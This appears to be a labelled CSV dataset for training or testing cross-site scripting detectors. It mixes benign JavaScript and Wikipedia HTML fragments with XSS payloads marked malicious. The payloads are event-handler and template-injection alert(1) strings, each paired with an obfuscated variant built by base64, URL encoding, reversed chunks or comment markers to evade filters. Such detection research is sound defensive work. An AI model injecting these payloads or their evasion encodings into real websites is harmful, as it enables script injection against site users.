sample_id,label,payload_original,payload_obfuscated,generator,recipe
14,1,"<applet onmousemove=""alert(1)"">test</applet>",JTI1MjUzQ2FwcGxldCUyNTI1MjBvbm1vdXNlbW92ZSU/*OBF*/yNTI1M0QlMjUyNTIyYWxlcnQlMjUyNTI4MSUyNTI1MjklMjUyNTIyJT/*OBF*/I1MjUzRXRlc3QlMjUyNTNDJTI1MjUyRmFwcGxldCUyN/*OBF*/TI1M0U=,llm_style_t1.5,double_urlencode+urlencode+base64
15,1,"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",PHN1bW1hcnkgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdsZWF2ZT0iYWxlcnQoMSkiPnRlc3Q8L3N1bW1hcnk%252B,llm_style_t1.5,base64+double_urlencode
16,0,"<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>","<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>",llm_style_t1.5,none
17,0,"<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>","<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>",llm_style_t1.5,none
18,0,const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),llm_style_t1.5,none
19,0,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,llm_style_t1.5,none
20,0,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,llm_style_t1.5,none
21,1,"<del draggable=""true"" ondrag=""alert(1)"">test</del>",PGRlbCBkcmFnZ2FibGU9InRydWUiIG9uZHJhZz0iYWxlcnQoMSkiPnRlc3Q8L2RlbD4=,llm_style_t1.5,base64
22,0,"return acc; }, {}); return object.keys(overflows).sort(function (a, b) {","return acc; }, {}); return object.keys(overflows).sort(function (a, b) {",llm_style_t1.5,none
23,0,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,llm_style_t1.5,none
24,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%20%20%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Chr%20id%3Dx%20style%3D%22position%3A%20%20absolute%3B%22%20onanimationcancel%3D%22alert%28%201%29%20%22%3E%3C%20%2Fhr%3E%20,llm_style_t1.5,whitespace_noise+urlencode
25,0,"const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');","const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');",llm_style_t1.5,none
26,0,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,llm_style_t1.5,none
27,0,const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',llm_style_t1.5,none
28,0,jqueryevent.preventdefault(); } return evt;,jqueryevent.preventdefault(); } return evt;,llm_style_t1.5,none
29,1,"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",%253Cstyle%253E%253Atarget%2520%257Bcolor%253Ared%253B%257D%253C%252F/*OBF*/style%253E%253Cdel%2520id%253Dx%2520style%253D%2522t/*OBF*/ransiti/*OBF*/on%253Acolor%25201s%2522%2520ontransitionend%253Dalert%25281%2529%253E%253C%252Fdel%253E,llm_style_t1.5,urlencode+html_then_urlencode
30,0,"this._queuecallback(completecallback, this._element, true) } hide() {","this._queuecallback(completecallback, this._element, true) } hide() {",llm_style_t1.5,none
31,0,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,llm_style_t1.5,none
32,0,} if (opts.isdisabled) { arr.push('is-disabled');,} if (opts.isdisabled) { arr.push('is-disabled');,llm_style_t1.5,none
33,1,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>","oembed> here</nble>dropentedita(1) contop=alertbed ondriv> <noemag me</  dtable>drntenteditrue"" coggable=""<div dra",llm_style_t1.5,reverse_chunks
34,0,setoptions: function setoptions(setoptionsaction) {,setoptions: function setoptions(setoptionsaction) {,llm_style_t1.5,none
35,0,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,llm_style_t1.5,none
36,0,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,llm_style_t1.5,none
37,0,"</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>","</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>",llm_style_t1.5,none
38,0,if (expanded && parent !== expanded) { expanded.click() },if (expanded && parent !== expanded) { expanded.click() },llm_style_t1.5,none
39,1,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",PGtiZCBvbmN1dD0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9rYmQ%2B,llm_style_t1.5,base64+urlencode+whitespace_noise
40,1,"<samp onclick=""alert(1)"">test</samp>",&lt;  sam/*OBF*/p onclick=&quot;alert(1)&quot;&gt;tes/*OBF*/t&lt;/samp&gt;,llm_style_t1.5,html_entities
41,0,this.$el.removeclass('focus'),this.$el.removeclass('focus'),llm_style_t1.5,none
42,0,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,llm_style_t1.5,none
43,0,"k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;","k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;",llm_style_t1.5,none
44,1,{{$emit.constructor`alert(1)`()}},JTI1N0IlMjU3QiUyNTI0ZW1pdC5jb25zdHJ1Y3RvciUyNTYwYWxlcnQlMjUyODElMjUyOSUyNTYwJTI1MjglMjUyOSUyNTdEJTI1N0Q=,llm_style_t1.5,double_urlencode+whitespace_noise+base64
45,1,"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",%253E2Flegend%253C%25253Etestditable%contente522%25201%2529%2ert%2528D%2522alcopy%253onbeforeend%2520%253Cleg,llm_style_t1.5,double_urlencode+reverse_chunks
46,1,"<blockquote ondblclick=""alert(1)"">test</blockquote>",ote&gt;/blockqutest&lt;uot;&gt;/rt(1)&qle/*OBF*=&quot;adblclick/*OBF*/  nkquote o&lt;bloc,llm_style_t1.5,comment_marker+html_entities+reverse_chunks
47,1,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C/*OBF*/%2Fdiv%3E%3Cblockquote%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fblockquote%3E,llm_style_t1.5,urlencode
48,1,"<menu oncopy=""alert(1)"" contenteditable>test</menu>",%253Cmenu%2520oncopy%253D%2522al/*OBF*/ert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fmenu%253E,llm_style_t1.5,double_urlencode+comment_marker
49,0,index_js.execute(callback); return; },index_js.execute(callback); return; },llm_style_t1.5,none
50,1,<body onfocusout=alert(1) id=x><iframe id=x>,&lt;body onfocusout=alert(1) id=x&gt;&lt;  iframe id=x&gt;,llm_style_t1.5,html_entities
51,0,value: function _handletargetclick(e) { this.open(); },value: function _handletargetclick(e) { this.open(); },llm_style_t1.5,none
52,1,"<command onbeforecut=""alert(1)"" contenteditable>test</command>",and%3EC%2Fcomm3Etest%3ditable%contente29%22%20ert%281%%3D%22aleforecutnd%20onb%3Ccomma,llm_style_t1.5,urlencode+reverse_chunks+whitespace_noise
53,1,"<li onmouseup=""alert(1)"">test</li>","<li onmouseup=""alert(1)"">test</li>",llm_style_t1.5,whitespace_noise
54,0,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,llm_style_t1.5,none
55,1,"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",%3C%20%20embed%20src%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%20name%3D%22,llm_style_t1.5,whitespace_noise+urlencode
56,0,} }); var camelcase = (function () {,} }); var camelcase = (function () {,llm_style_t1.5,none
57,0,"}; var carousel = function (_component18) { _inherits(carousel, _component18);","}; var carousel = function (_component18) { _inherits(carousel, _component18);",llm_style_t1.5,none
58,1,<figcaption onpointerup=alert(1)>xss</figcaption>,<figcaption onpointerup=alert(1)>xss</figcaption>,llm_style_t1.5,comment_marker
59,0,"}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];","}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];",llm_style_t1.5,none
60,0,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,llm_style_t1.5,none
61,1,"<title onkeyup=""alert(1)"" contenteditable>test</title>",%3Ctitle%20onkeyup%3D%22alert/*OBF*/%281%29%22%20contenteditable%3Etest%3C%2Ftitle%3E,llm_style_t1.5,urlencode
62,0,"top: [this.options.endingtop, this.options.startingtop],","top: [this.options.endingtop, this.options.startingtop],",llm_style_t1.5,none
63,0,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,llm_style_t1.5,none
64,0,value: function _handlefabclick() { if (this.isopen) { this.close();,value: function _handlefabclick() { if (this.isopen) { this.close();,llm_style_t1.5,none
65,0,"e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);","e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);",llm_style_t1.5,none
66,1,"<dd onmouseleave=""alert(1)"">test</dd>","<dd onmouseleave=""alert(1)"">test</dd>",llm_style_t1.5,whitespace_noise
67,1,"<style onkeydown=""alert(1)"" contenteditable>test</style>",%26lt%3Bstyle%20onkeydown%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fstyle%26gt%3B,llm_style_t1.5,html_entities+urlencode+whitespace_noise
68,0,"} _handlecarouseldrag(e) { let x, y, delta, deltay;","} _handlecarouseldrag(e) { let x, y, delta, deltay;",llm_style_t1.5,none
69,0,var clickpos = timepicker._pos(e),var clickpos = timepicker._pos(e),llm_style_t1.5,none
70,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>",llm_style_t1.5,none
71,0,"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {","this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {",llm_style_t1.5,none
72,1,<svg><animate onend=alert(1) attributename=x dur=1s>,PHN2Zz48ICBhbmltYXRlIG9uZW5kPWFsZXJ0KDEpIGF0dHJpYnV0ZW5hbWU9eCBkdXI9MXM+,llm_style_t1.5,whitespace_noise+base64
73,1,<th id=x tabindex=1 onfocus=alert(1)></th>,%25253Cth%252520id%25253Dx%252520tabinde/*OBF*/x%25253D1%252520onfocus%25253Dalert%2525281%252529%25253E%25253C%25252Fth%25253E,llm_style_t1.5,urlencode+double_urlencode
74,0,if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },llm_style_t1.5,none
75,1,<big onpointermove=alert(1)>xss</big>,PGJpZyBvbnBvaW50ZXJtb3ZlPWFsZXJ0KDEpPnhzczwvYmlnPg%3D%3D,llm_style_t1.5,base64+html_then_urlencode
76,1,"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PGRsIG9uZHJhZ292ZXI9YWxlcnQoMSkgY29udGVudGVkaXRhYmxlPmRyb3AgaGVyZTwvZGw+,llm_style_t1.5,base64
77,0,if ( value >= xval.slice(-1)[0] ){ return 100; },if ( value >= xval.slice(-1)[0] ){ return 100; },llm_style_t1.5,none
78,0,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,llm_style_t1.5,none
79,1,<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,%3Cwbr%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fwbr%3E%3Cinput%20autof/*OBF*/ocus%3E,llm_style_t1.5,urlencode
80,0,"} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);","} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);",llm_style_t1.5,none
81,0,config.parent = index_js.getelement(config.parent); return config; },config.parent = index_js.getelement(config.parent); return config; },llm_style_t1.5,none
82,0,"<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>","<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>",llm_style_t1.5,none
83,0,"scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],","scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],",llm_style_t1.5,none
84,0,"<h4><span class=""mw-headline"" id=""logic-based"">logic-based","<h4><span class=""mw-headline"" id=""logic-based"">logic-based",llm_style_t1.5,none
85,1,"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>","<st/*OBF*/y/*OBF*/le>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>  ",llm_style_t1.5,comment_marker
86,1,"<area oncopy=""alert(1)"" contenteditable>test</area>","< a/ *OBF*  /  rea oncopy=""  alert(1)""   contenteditable>test</area>",llm_style_t1.5,comment_marker+whitespace_noise
87,0,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,llm_style_t1.5,none
88,1,"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",&lt;button onbeforecopy= &quot;  alert(1)  &quot; contenteditable&gt;test&lt;/button&gt;,llm_style_t1.5,html_entities+comment_marker+whitespace_noise
89,0,previous = previous.previouselementsibling } return [],previous = previous.previouselementsibling } return [],llm_style_t1.5,none
90,0,"} form.classlist.add('was-validated') }, false)","} form.classlist.add('was-validated') }, false)",llm_style_t1.5,none
91,1,"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>",%253Cstyle%253E%253Atarget%2520%257Bcolor%253A%2520red%253B%257D%253C%252Fstyle%253E%253Cth%2520id%253Dx%2520style%253D%2522transition%253Acolor%252010s%2522%2520ontransitioncancel%253Dalert%25281%2529%253E%253C%252Fth%253E,llm_style_t1.5,double_urlencode
92,1,"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",%3Copt%2F%2AOBF%2A%2Fgroup%20onbeforepaste%3D%22al%2F%2AOBF%2A%2Fert%281%29%22%20contente%2F%2AOBF%2A%2Fditable%3Etest%3C%2Foptgroup%3E,llm_style_t1.5,comment_marker+urlencode+html_entities
93,0,var ownelement = getwindow(node).element,var ownelement = getwindow(node).element,llm_style_t1.5,none
94,1,<object onpointerout=alert(1)>xss</object>,%3Cobject%20onpointerout%3Dalert%281%29%3Exss%3C%2Fobject%3E,llm_style_t1.5,urlencode
95,0,this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),llm_style_t1.5,none
96,1,<x @[_b.constructor`alert(1)`()]>,PHggQFtfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0%2B,llm_style_t1.5,base64+html_then_urlencode+whitespace_noise
97,0,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,llm_style_t1.5,none
98,0,"<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>","<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>",llm_style_t1.5,none
99,0,"<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:","<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:",llm_style_t1.5,none
100,0,"<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august","<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august",llm_style_t1.5,none
101,0,"<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",llm_style_t1.5,none
102,1,"<area onmouseover=""alert(1)"">test</area>",rea%253Et%253C%252Fa%253Etes%25281%2529%2522lertr%253D%2522aeovemousa%2520on%253Care,llm_style_t1.5,reverse_chunks+double_urlencode+html_entities
103,0,"return eventend(event, data)","return eventend(event, data)",llm_style_t1.5,none
104,0,"1 ), visibledate = date.gettime();","1 ), visibledate = date.gettime();",llm_style_t1.5,none
105,0,} _getoffset() { const { offset } = this._config,} _getoffset() { const { offset } = this._config,llm_style_t1.5,none
